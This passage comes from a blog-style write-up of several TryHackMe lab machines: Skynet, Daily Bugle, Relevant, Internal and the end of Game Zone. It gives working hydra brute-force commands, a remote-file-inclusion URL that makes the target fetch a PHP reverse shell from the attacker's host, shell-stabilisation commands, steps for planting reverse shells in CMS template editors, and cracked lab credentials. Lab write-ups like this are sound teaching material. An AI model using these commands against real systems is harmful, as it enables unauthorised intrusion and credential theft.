We move it with wget and a python http server an runnit after give to it execution permissions:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011183105.png' | relative_url }}" text-align="center"/>
</div>

The script locate a port 10000 open in all the interfaces (0.0.0.0) but its not identified by nmap:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011183431.png' | relative_url }}" text-align="center"/>
</div>

The other one is the internal service offered by the DBMS MySQL.

Then, we proceed to investigate what this port offer, and try to access it with netcat:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011183520.png' | relative_url }}" text-align="center"/>
</div>

We see that the server is "webmin" but for some reason although this port is externaly open it refuses our conections tries. Then, we try to conect at the same way through the victim machine, as a internal way:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011184053.png' | relative_url }}" text-align="center"/>
</div>

Thus, we see that it receives internals requests (probably as a security layer) and it offers HTTP service. This raises a problem because, since our access to the machine is thorugh SSH, we can't use internaly the browser so our better chance is use PortForwarding to perform a internal conexión through a redirection from a local port connected by our browser.

So we employ the following command in our machine:

```bash
ssh -L 10000:localhost:10000 agent47@<IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011184545.png' | relative_url }}" text-align="center"/>
</div>

*This use the redirection feature of the ssh client command to forward the conexions issued to our local port 10000 to the port 10000 of the victim machine through SSH tunneling as our stealed user acount 'agent47'. This means that our commands will be receive as commands ordered by the user 'agent47' on the victim machine, letting us to access the internal service.*

Then, open our browser and connecto to 'localhost:10000' and:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011185231.png' | relative_url }}" text-align="center"/>
</div>

The information there displayed is useful to seek an [exploit](https://www.exploit-db.com/exploits/21851) to elevate privileges. In the instructions of the exploit appears that this is part of the metasploit enviroment:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011185520.png' | relative_url }}" text-align="center"/>
</div>

So we search for it in the C2 enviroment:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011185638.png' | relative_url }}" text-align="center"/>
</div>

And use it following the [instructions](https://medium.com/@CyberOPS.LittleDog/tryhackme-game-zone-864ad2ad93f8) to gain access to a levereged shell.



#### 2.5. Skynet (Http enumeration, SMB enumeration, CMS, Remote File Inclusion, Kernel Exploits) .

In this case we are facing a Linux machine with SSH, HTTP, SMB (Samba), POP3 (Dovecot) services in default ports. So we proceed to do enumeration of this services:

- *Http Enumeration*: First, http service, the web app. When we access to the main page it appears a search-bar that suggest a posible sqlinjection but a test with sqlmap provees that is not the case:


<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011220019.png' | relative_url }}" text-align="center"/>
</div>

We use it saving a request capture with BurpSuite and employ it in the command above the image before.

```bash
sqlmap -r requestedcapturedwithBurp.txt --dbs
```

So we continue our enumerating process with *dirb* tool, that seems to show a lot of content:

```bash
dirb http://<IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011220423.png' | relative_url }}" text-align="center"/>
</div>

And we can see that we have a login section over the web app:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011220457.png' | relative_url }}" text-align="center"/>
</div>

Where the version of the software appears too which can lead to a exploit method. A simply search in google lead us to [CVE-2017-7692](https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html) that is a RCE exploit that affect to SquirrelMail version 1.4.23 but it requires credentials and thus a user is needed:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011220835.png' | relative_url }}" text-align="center"/>
</div>

First, we try to login with some defaults credentials but there is not luck.

So in order to recolect some information we proceed to enumerate the other services.

<br />

- *Samba Enumeration*: Since SMB is a windows-exclusive protocol, for Linux we have a SMB software implemetation named Samba. Thus, we first proceed to run a SMB-Enum nse script with Nmap and obtain the following results:

```bash
nmap --script smb-enum-shares.nse -p445 10.10.18.232
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011221605.png' | relative_url }}" text-align="center"/>
</div>

There we can see that the 'guest' user is avialable with most likely not password that shares the /srv/samba directory through the anonymous account, that exist a user named 'Miles' that is sharing one directory in his home directory through the account 'milesdyson'.

So, we use *smbclient* tool to access to the anonymous share with the guest user:

```bash
smbclient \\\\<IP>\\Anonymous -U=Guest
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011222310.png' | relative_url }}" text-align="center"/>
</div>

We got an attention.txt file that displays a message about a generalizated change of passwords

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011222351.png' | relative_url }}" text-align="center"/>
</div>

and a 'logs' directory where are stored three files of which only one have some content; log1.txt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011222459.png' | relative_url }}" text-align="center"/>
</div>

According with the content of the message above it seems clearly that this list are a list of passwords and one of them would be the password of the user Miles.

<br />

- *Accessing the web with Hydra*:

So with the information recopiled before we're going to perfom a dictiory-list attack with hydra over the Miles account, which is most likely to be 'milesdyson' according the SMB enumeration, with the log1.txt as the list of candidates to passwords. We will employ the following command:

```bash
hydra -l milesdyson -P log1.txt 10.10.133.54 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

This is constructed throguh the steps below:

- In first place the user name and the password are extracted of the SMB enumeration as we have seen before.

- Next, we try a login attemp and see that the page send the data in HTTP-POST method, so we use "http-post-form" and then we need:

- The login file, disponible by the Inspector > Network:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012093114.png' | relative_url }}" text-align="center"/>
</div>

- The data parameters from the POST request, accesible again by Inspector > Network > (Select request) Params:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012093446.png' | relative_url }}" text-align="center"/>
</div>

- And the error message, we obtain it sending a fail login attemp:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012093522.png' | relative_url }}" text-align="center"/>
</div>

An the results shown that we find a credential milesdyson:cyborg007haloterminator

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012093552.png' | relative_url }}" text-align="center"/>
</div>

And then, we proceed with the exploit to gain RCE over the server.

- *Attempting to gaing access*: The link to the exploit from Github is [here](https://github.com/xl7dev/Exploit/blob/master/SquirrelMail/SquirrelMail_RCE_exploit.sh). But for some reason it not make success. Thus, we continue exploring the webapp.

<br />

- *HTTP Enumeration with credentials*: Once we logged in our user we see that skynet has send to us a message in which gives our new password for SMB: )s{A&2Z=F^n_E.B\`

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012115058.png' | relative_url }}" text-align="center"/>
</div>

So, we use it to access the milesdyson share with smbclient:

```bash
smbclient \\\\10.10.157.104\\milesdyson -U=milesdyson
```

We discover a 'notes' directory

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012115334.png' | relative_url }}" text-align="center"/>
</div>

And then, a note; 'important.txt'

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012115458.png' | relative_url }}" text-align="center"/>
</div>

When open it, we discover the directorion of a CMS: /45kra24zxs28v3yd

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012115531.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012115824.png' | relative_url }}" text-align="center"/>
</div>

A CMS stands for Content Management System, which is a software which cares for manage a web application, so is most likely to behaviour like a root directory with subdirectories so it would be worth to map it with dirb:

```bash
dirb http:<IP>
```

Dirb discover a /administrator which claims for autentication. In the page we see the name of the server, Cuppa CMS.


- *Accessing the server*:

We attemp to seek an [exploit](https://www.exploit-db.com/exploits/25971) in which is described a Remote File Inclusion vulnerability of the server.

We can obtain advantage of this uploading a reverseshell.

First, we download a php reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), then we modify the IP and the port of the php file nad set up a listner mathcing the port set in the field before

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012165754.png' | relative_url }}" text-align="center"/>
</div>

Next, we read the description of the vulnerability to exploit the server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012164820.png' | relative_url }}" text-align="center"/>
</div>

The exploit consist on the presence of two debilities that conforms a vulnerability; a SSRF and a Remote File Execution. This is that exists a directory that can download a file from a server and then, if the file is PHP code it gets execute too. Thus, we open a http server with python over the directory where is stored the php file in our local machine:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012165239.png' | relative_url }}" text-align="center"/>
</div>

And then we employ the following URL in the browser:

```url
http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<LocalIP>/php-reverse-shell.php
```

This will provoke that the server perform a download of a php file from our server and then, gets the php file execute triggering a reverse shell call.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012170848.png' | relative_url }}" text-align="center"/>
</div>

- *Elevating Privileges*: Once there, we can use a kernel-exploit.

First, we stabilize the netcat shell with the following commands:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Then, we press Ctrl+Z and we will be back in our local machine and then press:

```bash
stty raw -echo; fg
```

That will bring us back the connection with a totally stablish shell.

Then, we use the command: *uname -r* to know the version of the kernel:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012175100.png' | relative_url }}" text-align="center"/>
</div>

And search in google for a [exploit](https://github.com/kkamagui/linux-kernel-exploits). Then we download it in our local machine and go to the directory which name match the version of the kernel an init a python http server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012175244.png' | relative_url }}" text-align="center"/>
</div>

Then in the victim machine we go to the /tmp directory and download from our local machine the compile script and the source code of the vulnerability:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012175354.png' | relative_url }}" text-align="center"/>
</div>

We give exec permissions and execute the compile file and then the exploit file:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012175444.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.6. Daily Bugle (HTTP Enumeration: XML Version object, SQLi Exploit, John The Ripper, PHP Template Injection, .

- *Nmap Enumeration*: In this case with Nmap we can check that we're facing a Linux machine that offers in default ports SSH, HTTP and MySQL services.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012215139.png' | relative_url }}" text-align="center"/>
</div>

The defaults scripts that Nmap runs inform us that the web app have the file /robots.txt habilitate so we proceed to retrieve sensible information through the files that are there.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012215438.png' | relative_url }}" text-align="center"/>
</div>

On the /administrator we found a login portal to a CMS managed by Joomla!.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012215946.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Finding out CMS's version*: We can try to seek an exploit for it but for that, first we need the software version. This can be found in the others flies, at first we can commit a mistake by assuming that the version of the modules installed is the correct version of the software:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012203213.png' | relative_url }}" text-align="center"/>
</div>

The autentic version is in the /language directory

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221012203247.png' | relative_url }}" text-align="center"/>
</div>

With the name of the CMS and the version we found we can search for a exploit to gain initial access to the web.

<br />

- *SQLi Exploit and gaining access to the web*: Searching we obtain the following [exploit](https://www.exploit-db.com/exploits/42033) that can be found has a [python script](https://github.com/stefanlucas/Exploit-Joomla) too. This describe an SQLi injection and give the indications to exploit it. After the execution, we retrieve a user and a hash of a password:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013093943.png' | relative_url }}" text-align="center"/>
</div>

At first we try to identify the hash with tools like Hash-identifier or CyberChef but there is no luck so we pass the hash over directly JohnTheReaper who identifiy the hash and give us the password:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013094059.png' | relative_url }}" text-align="center"/>
</div>

Now we are in the web as administrator or super user.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013112140.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Template PHP Injection*: We have to find a way in the server. First we can search about an upload vulnerability to include a reverse shell in the web. We find an upload image function but it seems to not work:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013165535.png' | relative_url }}" text-align="center"/>
</div>

Im think in insist by going to the System > Global Configuration and chanching the configuration:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013165629.png' | relative_url }}" text-align="center"/>
</div>

But i not success.

Then i find a template engine that runs php code on Control Panel > Templates > Beez3 > Editor > index.php

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013165804.png' | relative_url }}" text-align="center"/>
</div>

If this engine is not securize enough it can lead to the execution of malicious code. We copy the code of a [reverse shell](https://github.com/pentestmonkey/php-reverse-shell) on the template and then we save it and run it by pressing the "Template Preview" button. Since we put the code on the index.php, when the templates loads the code gets executed and we obtain a shell on a listener set up before:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013170246.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Lateral Escalation Privilege*: Now that we have a Netcat shell, we proceed to stabilished with the following commands:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Then Ctrl+Z and, in our local machine:

```bash
stty raw -echo; fg
```

Then, after a serial attemps to elevate privileges through SUID files, Sudo perm, Capabilites, etc we found a configuration file in /var/www/html with credentials:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013170727.png' | relative_url }}" text-align="center"/>
</div>

First we tried the root user but the autenticacion faile so we try with 'jjameson' user:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013171002.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Vertical Privilege Escalation*:

And with this user we have a sudo permision over Yum:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013171157.png' | relative_url }}" text-align="center"/>
</div>

So we go to [GTFOBins](https://gtfobins.github.io/gtfobins/yum):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013171422.png' | relative_url }}" text-align="center"/>
</div>

And copy and execute the following code:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013171625.png' | relative_url }}" text-align="center"/>
</div>

And we upgrade to root:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221013171658.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.8. Relevant (HTTP, SMB Enumeration, PSExec, HTTP-SMB Explotation with aspx shell, Printspoofer).

- *Port Scanner*: In this case we are facing a Microsoft Windows Server. Following the port scanner (nmap -T5 -A -p-) it seems to have a HTTP, SMB, RDP, WinRM services on defaults ports and severals RPC ports.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014092514.png' | relative_url }}" text-align="center"/>
</div>

Something to be notice is that there are two HTTP ports, port 80 and 49663, it seems to be a third but that should not make us fall into error because a more detailed exam (nmap -p5985 -T5) of that port shown us that not is indeed a http port:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014094143.png' | relative_url }}" text-align="center"/>
</div>

Is a winRM port. So we estart with ennumeartion Job.

<br />

- *HTTP/SMB Enumeration*: At first, we try to enumerate the application through the port 80:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014124504.png' | relative_url }}" text-align="center"/>
</div>

But we not have results. Then we try to enumerate through the port 49663 but neither obtain any relevant:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014125153.png' | relative_url }}" text-align="center"/>
</div>

Then we proceed to enumerate SMB. We will start through nse scripts:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

<br />

And then we find some SMB shares that are accesibles through the Guest users. In one of them, the share: nt4wrksv, we found some credentials:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014125638.png' | relative_url }}" text-align="center"/>
</div>

This credentials are encoded in base64:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014130131.png' | relative_url }}" text-align="center"/>
</div>

But do not seems to work with loggin wondows tools like xfreerdp or rdesktop.

With psexec we can see that infact Bill is a faker user and cannot be recognized by the system

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014131148.png' | relative_url }}" text-align="center"/>
</div>

while Bob exists but his password is fake

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014131158.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Upload file vulnerability*: At last, we found that the SMB shares are at the same time directories of the web on port 49663:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014174756.png' | relative_url }}" text-align="center"/>
</div>

Plus, we find that the user 'Guest' have writeable permissions so we can write and upload a file:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014175151.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014175203.png' | relative_url }}" text-align="center"/>
</div>

Thus, we must find a file format that executes code on the server to gain access through a reverse shell.

<br />

- *Explotation*: To obtain this purpouse we are going to use the *aspx* format. This is a file format for web servers that use the Microsoft ASP.NET framework. Since this is a Windows Server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014181242.png' | relative_url }}" text-align="center"/>
</div>

This seems to be the correct format of file. We could create a payload with MSFVenom since it supports the aspx format

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014182246.png' | relative_url }}" text-align="center"/>
</div>

But we going to use this [aspx shell](https://github.com/borjmz/aspx-reverse-shell) from github. We download the code and do the procedimentals changes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014182351.png' | relative_url }}" text-align="center"/>
</div>

And then we upload through the SMBclient:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014230805.png' | relative_url }}" text-align="center"/>
</div>

Then setup a netcat listener and execute the code by going to the file on the web through the share directory:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014231445.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014231517.png' | relative_url }}" text-align="center"/>
</div>

Then we get the flag and continue to elevate privileges:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014231859.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Privilege Escalation*: When we enumerate the privileges of the current user we see that we have the SeImpersonatorPrivilege, which can be used to escalate privileges through a [potato attack](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens). You can get a privilege token from a Windows server through DCOM, but in this machine DCOM is unhabilitated.

So we use the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) exploit for Windows 10 and Servers. This exploits said, "From LOCAL/NETWORK SERVICE to SYSTEM by abusing \`SeImpersonatePrivilege\` on Windows 10/Server"

So we download it to the kali machine and upload to the victim through the SMBShare (although we can use powershell wget cmdlet too).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221014235627.png' | relative_url }}" text-align="center"/>
</div>

Since i got an error when i try to compile the code:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221015000631.png' | relative_url }}" text-align="center"/>
</div>

I download an already [compiled executable](https://github.com/dievus/printspoofer) and then:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221015000830.png' | relative_url }}" text-align="center"/>
</div>

Thus, we complete the machine.


#### 2.9. Internal.

Note pre-start. We have to modify in our attack machine the /etc/hosts file and introduce the following line: \<VictimIP> internal.thm:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221102164036.png' | relative_url }}" text-align="center"/>
</div>

If we don't do this, the web site will not work properly and we won't be able to complete the machine.

- *Port Scanning*: In this case, we are facing a Ubuntu machine with SSH and HTTP services on defaults ports open:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221015114748.png' | relative_url }}" text-align="center"/>
</div>

Thus, we proceed to do HTTP Enumeration.

<br />

- *Gaining access to the web*: We attemp to map the web with dirb. We found that exists a section named blog in which are a post by a user "admin"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103173407.png' | relative_url }}" text-align="center"/>
</div>

and a log in section in /blog/wp-login.php.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103173422.png' | relative_url }}" text-align="center"/>
</div>

So we try to bruteforce the admin user with the rockyou.txt to gain access to web with hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.121.21 http-post-form "/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -vv
```

And we found some valids credentials: admin:my2boys

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103182442.png' | relative_url }}" text-align="center"/>
</div>

- "Exploring the website and gaining initial access:" Once there, we are in the /blog/wp-admin/ file and we wanna find some way to gain access into the machine. Some way to execute a reverse shell.

Finally, we found a section of the web in which we have writeable permissions and it executes code php on Dashboard > Themes > Theme Editor:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103213709.png' | relative_url }}" text-align="center"/>
</div>

Thus, we generate a [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), save the changes on the index.php and set up a netcat listener. Then, we visit http://internal.php/blog and we get initial access:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103214655.png' | relative_url }}" text-align="center"/>
</div>

And then only remains to stabilise the shell with python.

<br />

- "Privilege Escalation": At first we appear as the www-data user, in the /opt folder are stored credentials:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103215700.png' | relative_url }}" text-align="center"/>
</div>

So we upgrade to the aubreanna:bubb13guM!@#123 user vis ssh.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221103215751.png' | relative_url }}" text-align="center"/>
</div>

In the other hand, we have a file in which is writed that there is a jenkis running as a internal service:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104190238.png' | relative_url }}" text-align="center"/>
</div>

Jenkis is a web service accesible thorugh a browser but, since we only have command-line based access we have to use SSH Tunneling in order to connect with our browser to this internal service:

```bash
ssh -N -L 9999:172.17.0.2:8080 aubreanna@10.10.127.95
```

The command above will ise the forwarding feature of the SSH command to forward any connection perfomerd over our port 9999 to the 8080 port of the machine 172.17.0.2 through the account aubreanna on internal.thm without spawn shell.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104191650.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104191703.png' | relative_url }}" text-align="center"/>
</div>

Thus, we try to bruteforce the admin user with hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 9999 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=/&Submit=Sign+in:Invalid username or password" -v
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104193356.png' | relative_url }}" text-align="center"/>
</div>

Once there, we know that we have a script console in which we can run Java scripts like [this](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104194739.png' | relative_url }}" text-align="center"/>
</div>

And like this:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104194758.png' | relative_url }}" text-align="center"/>
</div>

And in the /opt directory:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221104195221.png' | relative_url }}" text-align="center"/>
</div>

